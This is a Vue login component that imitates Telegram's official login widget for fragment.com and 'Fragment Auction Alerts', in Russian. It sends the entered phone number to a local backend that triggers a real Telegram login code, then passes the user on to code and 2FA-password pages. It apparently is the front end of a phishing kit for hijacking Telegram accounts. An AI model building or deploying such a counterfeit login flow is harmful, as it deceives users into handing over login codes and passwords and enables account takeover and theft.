<template>
  <main class="login">
    <a href="https://core.telegram.org/widgets/login" target="_blank" class="login_about"></a>

    <section v-if="isLoading && !errorMessage" class="login_content loading-state" id="login-container">
      <div class="login_photos">
        <span class="login_telegram_photo_wrap">
          <i class="login_telegram_photo"></i>
        </span>
      </div>
      <div class="loader-wrap">
        <div class="loader"></div>
      </div>
    </section>

    <section v-else class="login_content" id="login-container">
      <div class="login_photos">
        <span class="login_telegram_photo_wrap arrowed">
          <i class="login_telegram_photo"></i>
        </span>
        <a href="https://t.me/fragment" target="_blank">
          <i class="login_bot_photo bgcolor3" data-content="F">
                            <img
                                src="data:image/jpeg;base64,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">
                        </i>
        </a>
      </div>

      <div class="login_header_text">
        Войдите, чтобы использовать аккаунт Telegram<br>
        для <span dir="auto">fragment.com</span> и 
        <a class="bot_name" dir="auto" href="https://t.me/fragment" target="_blank">Fragment Auction Alerts</a>.
      </div>

      <div class="login_confirm_text">
        Введите свой <b>номер телефона</b> в 
        <a target="_blank" rel="noopener" href="https://telegram.org/faq#login-and-sms">международном формате</a>.
        Подтверждение будет отправлено в Telegram.
      </div>

      <!-- FORM OPEN -->
      <form id="send-form" class="login_form" @submit.prevent="submitForm">

        <div class="login_form_group" id="login-form-group">

          <div class="login_country_field_wrap" id="login-country-wrap" ref="dropdownRef">
            <div class="login_country_select is-dirty" @click="toggleSearch" id="login-country-selected">
              {{ selectedCountry.name }}
            </div>

            <div class="login_country_search_wrap" v-show="isSearching">
              <div class="textfield-item">
                <input type="text" class="form-control" v-model="searchQuery" placeholder="Поиск" ref="searchInput">
                <div class="textfield-item-underline"></div>
              </div>
              <ul class="login_country_list">
                <li v-for="c in filteredCountries" :key="c.code" @click="selectCountry(c)">
                  <span>{{ c.name }}</span>
                  <span class="country-code-hint">{{ c.code }}</span>
                </li>
              </ul>
            </div>
          </div>

          <div class="login_phone_field_wrap">
            <div class="login_code_field_wrap">
              <div class="textfield-item">
                <input type="tel" class="form-control" v-model="code" @input="onCodeInput">
                <div class="textfield-item-underline"></div>
              </div>
            </div>

            <div class="login_number_field_wrap">
              <div class="textfield-item">
                <input type="tel" class="form-control" :value="phoneNumber" @input="handlePhoneInput">
                <div class="textfield-item-underline"></div>
                <label class="textfield-item-placeholder" :class="{ hide: phoneNumber.length > 0 }">
                  {{ placeholderMask }}
                </label>
              </div>
            </div>
          </div>

        </div>

        <div v-if="errorMessage" class="error-message">
          {{ errorMessage }}
        </div>

        <div class="login_button_wrap">
          <button class="button-item button-item-flat ripple-handler" type="button" :disabled="isLoading"
            @click="router.push({ name: 'Login' })">
            <span class="button-item-label">Отмена</span>
            <span class="ripple-mask"><span class="ripple"></span></span>
          </button>

          <button class="button-item ripple-handler" type="submit" :disabled="isLoading">
            <span class="button-item-label">{{ isLoading ? 'Проверка...' : 'Далее' }}</span>
            <span class="ripple-mask"><span class="ripple"></span></span>
          </button>
        </div>

        <div v-if="isDevMode" class="dev-bypass-links">
          <a href="#" @click.prevent="bypassCodeVerification">Пропустить ввод номера</a> |
          <a href="#" @click.prevent="bypassPasswordVerification">Пропустить код (нужен 2FA)</a>
        </div>

      </form>
      <!-- FORM CLOSE -->

    </section>
  </main>
</template>


<script setup>
import { ref, computed, watch, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { countriesData } from '@/data/countries';

const router = useRouter();

// --- DEV MODE / BYPASS ---
const isDevMode = import.meta.env.DEV; 

const defaultCountry = countriesData.find(c => c.name === 'Россия') || countriesData[0];

const selectedCountry = ref(defaultCountry);
const code = ref(defaultCountry.code);
const phoneNumber = ref('');

const isSearching = ref(false);
const searchQuery = ref('');
const searchInput = ref(null);
const dropdownRef = ref(null);
const isLoading = ref(false);
const errorMessage = ref('');

const filteredCountries = computed(() => {
  if (!searchQuery.value) return countriesData;
  const q = searchQuery.value.toLowerCase();
  return countriesData.filter(c =>
    c.name.toLowerCase().includes(q) ||
    c.code.includes(q)
  );
});

const placeholderMask = computed(() => {
  return selectedCountry.value.mask.replace(/#/g, '−');
});

const toggleSearch = () => {
  isSearching.value = !isSearching.value;
  if (isSearching.value) {
    setTimeout(() => searchInput.value?.focus(), 100);
  } else {
    searchQuery.value = '';
  }
};

const selectCountry = (country) => {
  selectedCountry.value = country;
  code.value = country.code;
  phoneNumber.value = '';
  isSearching.value = false;
  searchQuery.value = '';
  errorMessage.value = '';
};

const handleClickOutside = (event) => {
  if (dropdownRef.value && !dropdownRef.value.contains(event.target)) {
    isSearching.value = false;
    searchQuery.value = '';
  }
};

const fetchCountryByIp = async () => {
  isLoading.value = true;
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    let phoneCode = data.country_calling_code;

    if (phoneCode) {
      if (!phoneCode.startsWith('+')) {
        phoneCode = `+${phoneCode}`;
      }

      const foundCountry = countriesData.find(c => c.code === phoneCode);

      if (foundCountry) {
        selectedCountry.value = foundCountry;
        code.value = foundCountry.code;
      }
    }

  } catch (error) {
    
  } finally {
    isLoading.value = false;
  }
};

const sendNumberForValidation = async (cleanNumber) => {
    const apiUrl = 'http://localhost:8000/request-code'; 
    
    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ phone_number: cleanNumber })
        });
        
        if (response.ok) {
            const data = await response.json();
            return { success: true, phone_code_hash: data.phone_code_hash };
        } else {
            const errorData = await response.json();
            const errorMessage = errorData.detail?.message || `Ошибка сервера: статус ${response.status}.`;
            return { success: false, message: errorMessage };
        }

    } catch (error) {
        return { success: false, message: 'Не удалось подключиться к API Telegram (localhost:8000).' };
    }
};


const onCodeInput = (e) => {
  let val = e.target.value;
  if (!val.startsWith('+')) {
    val = '+' + val.replace(/\+/g, '');
  }
  code.value = val;
  errorMessage.value = '';
};

watch(code, (newVal) => {
  const found = countriesData.find(c => c.code === newVal);

  if (found && found.code !== selectedCountry.value.code) {
    if (newVal === '+7') {
      if (selectedCountry.value.code !== '+7') {
        selectedCountry.value = found;
      }
    } else {
      selectedCountry.value = found;
    }
  }
  errorMessage.value = '';
});

const handlePhoneInput = (e) => {
  let rawValue = e.target.value.replace(/\D/g, '');
  const mask = selectedCountry.value.mask;

  let formatted = '';
  let digitIndex = 0;

  for (let i = 0; i < mask.length; i++) {
    if (digitIndex >= rawValue.length) break;

    if (mask[i] === '#') {
      formatted += rawValue[digitIndex];
      digitIndex++;
    } else {
      formatted += mask[i];
    }
  }

  phoneNumber.value = formatted;
  errorMessage.value = '';
};

const submitForm = async () => {
  errorMessage.value = '';
  const cleanNumber = code.value + phoneNumber.value.replace(/\D/g, '');
  const prettyNumber = code.value + ' ' + phoneNumber.value;
  
  if (cleanNumber.length < 5) {
     errorMessage.value = 'Введите полный номер телефона.';
     return;
  }

  isLoading.value = true;
  try {
    const validationResult = await sendNumberForValidation(cleanNumber);
    
    if (validationResult.success) {
      localStorage.setItem('telegram_phone', cleanNumber);
      localStorage.setItem('telegram_phone_pretty', selectedCountry.value.name + ': ' + prettyNumber);
      localStorage.setItem('telegram_phone_code_hash', validationResult.phone_code_hash);
      router.push({ name: 'CodeVerification' }); 

    } else {
      errorMessage.value = validationResult.message;
    }

  } catch (e) {
    errorMessage.value = 'Произошла ошибка при отправке запроса.';
  } finally {
    isLoading.value = false;
  }
};

// --- BYPASS HANDLERS ---
const bypassCodeVerification = () => {
    localStorage.setItem('telegram_phone', '+48123456789'); 
    localStorage.setItem('telegram_phone_pretty', 'Польша: +48 123 456 789');
    localStorage.setItem('telegram_phone_code_hash', 'BYPASS_CODE_HASH'); 
    localStorage.removeItem('auth_required');
    router.push({ name: 'CodeVerification' });
};

const bypassPasswordVerification = () => {
    localStorage.setItem('telegram_phone', '+48987654321'); 
    localStorage.setItem('telegram_phone_pretty', 'Польша: +48 987 654 321 (2FA)');
    localStorage.setItem('telegram_phone_code_hash', 'BYPASS_CODE_HASH');
    localStorage.setItem('auth_required', 'true');
    router.push({ name: 'PasswordVerification' });
};

onMounted(() => {
  document.addEventListener('click', handleClickOutside);
  fetchCountryByIp();
});

onUnmounted(() => {
  document.removeEventListener('click', handleClickOutside);
});
</script>

<style>
:root {
  --text-color: #000;
  --body-bg: #fff;
  --accent-btn-color: #2481cc;
  --accent-color-hover: #1a8ad5;
}

html {
  font-family: sans-serif;
  -ms-text-size-adjust: 100%;
  -webkit-text-size-adjust: 100%;
}

body {
  font-family: "Roboto", sans-serif;
  background-color: var(--body-bg);
  color: var(--text-color);
  margin: 0;
  padding: 0;
}

button,
input {
  font: inherit;
  margin: 0;
}

button {
  overflow: visible;
  cursor: pointer;
}

input.form-control {
  display: block;
  width: 100%;
  background-image: none;
  border: none;
  height: auto;
  resize: none;
  color: inherit;
  background: transparent;
  border-bottom: 1px solid #e0e0e0;
  box-shadow: none;
  border-radius: 0;
}

input.form-control:focus {
  box-shadow: none;
  outline: 0;
  border-bottom: 2px solid #39ade7;
}

a {
  text-decoration: none;
  color: #2e87ca;
}

a:hover {
  text-decoration: underline;
}

.login {
  min-width: 320px;
}

.login_about {
  display: inline-block;
  width: 20px;
  height: 20px;
  background: var(--sf-img-8) no-repeat 0 0;
  margin: 16px;
  position: absolute;
  right: 0;
  top: 0;
}

.login_photos {
  padding: 15px 0 22px;
}

.login_telegram_photo_wrap {
  display: inline-block;
  margin: 15px 0;
}

.login_telegram_photo_wrap.arrowed {
  background: url("data:image/svg+xml,%3Csvg%20height%3D%2250%22%20viewBox%3D%220%200%2098%2050%22%20width%3D%2298%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%234ca3e2%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22m91.8%2019.5666667%208.5%2011.3333333c.331371.4418278.241828%201.0686292-.2%201.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847%200-1-.4477153-1-1%200-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709%201.4-.2.0758057.0568542.1431458.1241943.2.2z%22%20transform%3D%22matrix%280%201%20-1%200%20116.5%20-65.5%29%22%2F%3E%3Cpath%20d%3D%22m40%2021h46v8h-46z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E") no-repeat 0-15px;
  padding-right: 58px;
}

.login_telegram_photo {
  display: inline-block;
  vertical-align: top;
  width: 50px;
  height: 50px;
  border-radius: 25px;
  background: url(data:image/svg+xml,%3Csvg\ height=\"50\"\ viewBox=\"0\ 0\ 50\ 50\"\ width=\"50\"\ xmlns=\"http://www.w3.org/2000/svg\"%3E%3Cg\ fill=\"none\"\ fill-rule=\"evenodd\"%3E%3Ccircle\ cx=\"25\"\ cy=\"25\"\ fill=\"%234ca3e2\"\ r=\"25\"/%3E%3Cpath\ d=\"m11.1838302\ 25.1315363c7.1532767-2.9934727\ 11.9232482-4.9669531\ 14.3099145-5.9204412\ 6.8144173-2.7224024\ 8.2303949-3.1953128\ 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757\ 3.7267611-1.9671255\ 12.7706276-2.7800209\ 16.944664-.3439665\ 1.7661912-1.026197\ 2.1442046-1.6818831\ 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915\ 1.0898437-3.7680664.361326-.3604656\ 6.7509766-6.1621094\ 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715\ 2.2375171-10.3502001\ 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919\ 1.1713788-1.3298423z\"\ fill=\"%23fff\"/%3E%3C/g%3E%3C/svg%3E)no-repeat 0 0;
    margin: -15px 0;
}

.login_bot_photo {
  display: inline-block;
  vertical-align: top;
  width: 50px;
  height: 50px;
  border-radius: 25px;
  position: relative;
  font-style: normal;
  text-align: center;
  text-transform: uppercase;
  font-size: 24px;
  line-height: 52px;
  color: #fff;
  background: #e57979;
  overflow: hidden;
}

.login_bot_photo:before {
  content: attr(data-content);
  font-weight: 500;
}

.login_bot_photo img {
  position: absolute;
  left: 0;
  top: 0;
  width: 50px;
  height: 50px;
}

.login_header_text {
  font-weight: 500;
  margin-bottom: 12px;
  line-height: 21px;
}

.login_confirm_text {
  font-size: 15px;
  line-height: 21px;
}

.login_content {
  padding: 40px 20px 30px;
  text-align: center;
  max-width: 530px;
  margin: 0 auto;
}

.login_form_group {
  width: 270px;
  margin: 25px auto 35px;
}

.login_form_group input.form-control {
  font-size: 15px;
  line-height: 1.33;
  font-weight: normal;
  padding: 10px 0;
}

.login_country_field_wrap {
  position: relative;
  min-height: 42px; 
}

.login_country_field_wrap:before {
  content: "";
  float: right;
  display: inline-block;
  margin: 16px 10px 0;
  width: 14px;
  height: 9px;
  background: var(--sf-img-8) no-repeat -3px -29px;
}

.login_country_select {
  border-bottom: 1px solid #e6e6e6;
  display: block;
  margin: 0;
  width: 100%;
  text-align: left;
  cursor: pointer;
  position: relative;
  padding: 10px 0;
  font-size: 15px;
  height: 21px;
  line-height: 21px;
}

.login_country_search_wrap {
  position: absolute;
  top: 0; 
  left: 0;
  right: 0;
  background: #fff;
  z-index: 10;
  border-radius: 2px;
  padding: 10px;
  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); 
}

.login_country_list {
  list-style: none;
  padding: 0;
  margin: 10px 0 0 0;
  max-height: 200px;
  overflow-y: auto;
  text-align: left;
}

.login_country_list li {
  padding: 8px 10px;
  cursor: pointer;
  display: flex;
  justify-content: space-between;
}

.login_country_list li:hover {
  background-color: #f5f5f5;
}

.country-code-hint {
  color: #888;
  font-size: 0.9em;
}

.login_phone_field_wrap {
  padding-top: 10px;
  direction: ltr;
}

.login_code_field_wrap {
  width: 56px;
  margin-right: 12px;
  display: inline-block;
  vertical-align: top;
}

.login_number_field_wrap {
  width: 202px;
  display: inline-block;
  vertical-align: top;
  position: relative;
}

.textfield-item {
  display: block;
  position: relative;
  padding: 0 0 20px;
  margin: 0 0 -20px;
}

.textfield-item-underline {
  display: block;
  position: absolute;
  left: 50%;
  right: 50%;
  height: 2px;
  background: #39ade7;
  transition: all .2s ease-out;
  opacity: 0;
  bottom: 20px;
}

.textfield-item input:focus~.textfield-item-underline {
  left: 0;
  right: 0;
  opacity: 1;
}

.textfield-item-placeholder {
  bottom: 0;
  color: #ccc;
  left: 0;
  right: 0;
  pointer-events: none;
  position: absolute;
  display: block;
  top: 10px;
  width: 100%;
  overflow: hidden;
  white-space: nowrap;
  text-align: left;
  z-index: -1;
}

.textfield-item-placeholder.hide {
  display: none;
}

.login_code_field_wrap input {
  text-align: center;
}

.login_button_wrap {
  margin-top: 25px;
  padding-bottom: 20px;
}

.login_button_wrap button+button {
  margin-left: 10px;
}

.button-item {
  font-size: 14px;
  font-weight: 500;
  line-height: 18px;
  color: #fff;
  background: #4ca3e2;
  border-radius: 19px;
  display: inline-block;
  padding: 10px 26px;
  text-transform: uppercase;
  border: none;
  transition: background-color .2s ease;
}

.button-item:hover {
  background: #4199d9;
}

.button-item-flat {
  color: #1385d8;
  background: transparent;
}

.button-item-flat:hover {
  background: #e7f4fd;
}

.button-item-label {
  position: relative;
  z-index: 1;
}

.loading-state {
  min-height: 350px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  text-align: center;
}

.loader-wrap {
  margin-top: 20px;
  width: 30px;
  height: 30px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.loader {
  width: 25px;
  height: 25px;
  border: 3px solid #f3f3f3;
  border-top-color: #4ca3e2;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.error-message {
    color: #ff3333;
    font-size: 14px;
    margin-top: -15px;
    margin-bottom: 10px;
    padding: 0 50px;
    max-width: 270px;
    margin-left: auto;
    margin-right: auto;
    text-align: left;
}

.dev-bypass-links {
    margin-top: 20px;
    font-size: 12px;
    color: #888;
}
.dev-bypass-links a {
    color: #4ca3e2;
    text-decoration: none;
    margin: 0 5px;
}
.dev-bypass-links a:hover {
    text-decoration: underline;
}
</style>